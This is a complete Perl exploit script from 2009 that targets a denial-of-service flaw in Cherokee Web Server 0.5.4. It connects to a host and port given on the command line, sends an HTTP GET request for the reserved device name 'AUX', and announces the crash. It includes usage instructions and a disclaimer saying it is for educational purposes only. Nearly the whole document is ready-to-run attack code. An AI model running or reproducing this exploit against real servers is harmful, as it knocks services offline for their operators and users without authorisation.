#!/usr/bin/perl
# Cherokee Web Server 0.5.4 Denial Of Service
# Disclaimer:
# [This code is for Educational Purposes , I would Not be responsible for
any misuse of this code]
# Author: Usman Saeed
# Company: Xc0re Security Research Group
# Website: http://www.xc0re.net
# DATE: [25/10/09]

$host = $ARGV[0];
$PORT = $ARGV[1];

$packet = "AUX";

$stuff = "GET /".$packet." HTTP/1.1\r\n" .
"User-Agent:Bitch/1.0 (Windows NT 5.1; U; en)\r\n" .
"Host:$host\r\n".
"Accept: text/html, application/xml;q=0.9, application/xhtml+xml,
image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n".
"Accept-Language: en-US,en;q=0.9\r\n".
"Accept-Charset: iso-8859-1,*,utf-8\r\n".
"Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\r\n\r\n";


use IO::Socket::INET;
if (! defined $ARGV[0])
{
print "+========================================================+\n";
print "+ Program [Cherokee Web Server 0.5.4 Denial Of Service] +\n";
print "+ Author [Usman Saeed] +\n";
print "+ Company [Xc0re Security Research Group] +\n";
print "+ DATE: [25/10/09] +\n";
print "+ Usage :perl sploit.pl webserversip wbsvrport +\n";
print "+ Disclaimer: [This code is for Educational Purposes , +\n";
print "+ I would Not be responsible for any misuse of this code]+\n";
print "+========================================================+\n";

exit;
}

$sock = IO::Socket::INET->new( Proto => "tcp",PeerAddr => $host , PeerPort
=> $PORT) || die "Cant connect to $host!";
print "+========================================================+\n";
print "+ Program [Cherokee Web Server 0.5.4 Denial Of Service] +\n";
print "+ Author [Usman Saeed] +\n";
print "+ Company [Xc0re Security Research Group] +\n";
print "+ DATE: [25/10/09] +\n";
print "+ Usage :perl sploit.pl webserversip wbsvrport +\n";
print "+ Disclaimer: [This code is for Educational Purposes , +\n";
print "+ I would Not be responsible for any misuse of this code]+\n";
print "+========================================================+\n";


print "\n";
print "[*] Initializing\n";
sleep(2);
print "[*] Sendin DOS Packet \n";
send ($sock , $stuff , 0);
print "[*] Crashed :) \n";
$res = recv($sock,$response,1024,0);
print $response;

exit;